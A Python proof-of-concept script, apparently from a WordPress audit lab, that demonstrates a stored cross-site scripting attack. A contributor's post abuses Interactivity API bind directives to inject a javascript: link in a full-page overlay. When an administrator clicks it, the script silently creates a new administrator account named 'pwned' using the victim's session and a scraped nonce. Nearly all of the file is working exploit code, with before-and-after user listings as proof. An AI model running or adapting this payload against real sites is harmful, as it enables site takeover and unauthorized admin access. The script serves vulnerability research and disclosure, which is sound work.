#!/usr/bin/env python3
"""
Demonstrate the end impact rather than assert it: the injected script creates a
brand new administrator account using the victim administrator's own session.
"""
import json
import re
import subprocess
import requests
from playwright.sync_api import sync_playwright
from wplab import sess, BASE

CHROME = "/opt/pw-browsers/chromium-1194/chrome-linux/chrome"
WP = "/home/user/wpaudit/wordpress"

contrib = sess("contributor")
editor = sess("editor")
anon = requests.Session()


def wpcli(*a):
    return subprocess.run(["wp", "--allow-root", "--path=" + WP, *a],
                          capture_output=True, text=True).stdout.strip()


# Creates an administrator named "pwned" via wp-admin/user-new.php, using the
# victim's cookies and a nonce scraped from the page.  No '<' or '>' anywhere.
JS = (
    "fetch('/wp-admin/user-new.php')"
    ".then(function(r){return r.text()})"
    ".then(function(t){"
    "var n=t.match(/_wpnonce_create-user. value=.([a-f0-9]+)/)[1];"
    "var b=new URLSearchParams();"
    "b.append('action','createuser');"
    "b.append('_wpnonce_create-user',n);"
    "b.append('user_login','pwned');"
    "b.append('email','pwned@attacker.example');"
    "b.append('pass1','Sup3rSecret!Pwn3d');"
    "b.append('pass2','Sup3rSecret!Pwn3d');"
    "b.append('role','administrator');"
    "b.append('createuser','Add New User');"
    "return fetch('/wp-admin/user-new.php',{method:'POST',body:b})"
    "}).then(function(r){window.__PWNED__={status:r.status}});void 0"
)
CSS = "position:fixed;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;display:block"
CONTEXT = json.dumps({"u": "javascript:" + JS, "s": CSS})
PAYLOAD = (
    "<div data-wp-interactive='{\"namespace\":\"pwn\"}' "
    "data-wp-context='" + CONTEXT.replace("'", "&#039;") + "'>"
    "<a id=\"pwnlink\" data-wp-bind--href=\"context.u\" data-wp-bind--style=\"context.s\">"
    "&nbsp;</a></div>"
)
assert "<" not in JS and ">" not in JS

print("users BEFORE:")
print(" ", wpcli("user", "list", "--fields=ID,user_login,roles", "--format=csv").replace("\n", " | "))

pid = contrib.rest("POST", "/wp/v2/posts", json={
    "title": "Guest column", "content": PAYLOAD, "status": "pending"}).json()["id"]
editor.rest("POST", f"/wp/v2/posts/{pid}", json={"status": "publish"})
url = BASE + f"/?p={pid}"
print("\ncontributor's published post:", url)

srv = anon.get(url).text
m = re.search(r'<a id="pwnlink"[^>]*>', srv)
print("server-rendered anchor (no href, no style):", m.group(0) if m else "?")

with sync_playwright() as p:
    b = p.chromium.launch(executable_path=CHROME, args=["--no-sandbox"])
    page = b.new_context().new_page()
    page.goto(BASE + "/wp-login.php")
    page.fill("#user_login", "admin")
    page.fill("#user_pass", "AdminPass123!")
    page.click("#wp-submit")
    page.wait_for_load_state("networkidle")
    page.goto(url, wait_until="networkidle")
    page.wait_for_timeout(1500)
    vp = page.evaluate("() => ({w: innerWidth, h: innerHeight})")
    page.mouse.click(vp["w"] // 2, vp["h"] // 2)
    page.wait_for_timeout(3000)
    print("in-page result:", json.dumps(page.evaluate("() => window.__PWNED__ || null")))
    b.close()

print("\nusers AFTER:")
print(" ", wpcli("user", "list", "--fields=ID,user_login,user_email,roles", "--format=csv").replace("\n", " | "))
